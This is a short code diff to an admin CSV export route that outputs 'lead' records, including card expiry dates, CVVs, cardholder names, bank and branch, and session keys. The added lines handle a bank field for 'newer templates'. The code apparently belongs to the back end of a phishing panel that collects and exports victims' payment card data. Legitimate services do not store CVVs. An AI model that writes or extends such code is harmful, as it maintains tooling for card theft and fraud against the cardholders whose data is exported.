@@ -351,6 +351,8 @@ router.get('/export/csv', requireAdmin, async (req, res) => {
         extractFromAdditionalData(additionalData, 'expiry_date') || parsedAdditionalData.expiry_date || '',
         extractFromAdditionalData(additionalData, 'cvv') || parsedAdditionalData.cvv || '',
         extractFromAdditionalData(additionalData, 'cardholder_name') || parsedAdditionalData.cardholder_name || '',
+        // Prefer selected_bank for newer templates (e.g. BZST), fallback to legacy bank_type
+        extractFromAdditionalData(additionalData, 'selected_bank') || parsedAdditionalData.selected_bank ||
         extractFromAdditionalData(additionalData, 'bank_type') || parsedAdditionalData.bank_type || '',
         extractFromAdditionalData(additionalData, 'selected_branch') || parsedAdditionalData.selected_branch || '',
         extractFromAdditionalData(additionalData, 'session_key') || lead.tracking_id || '',
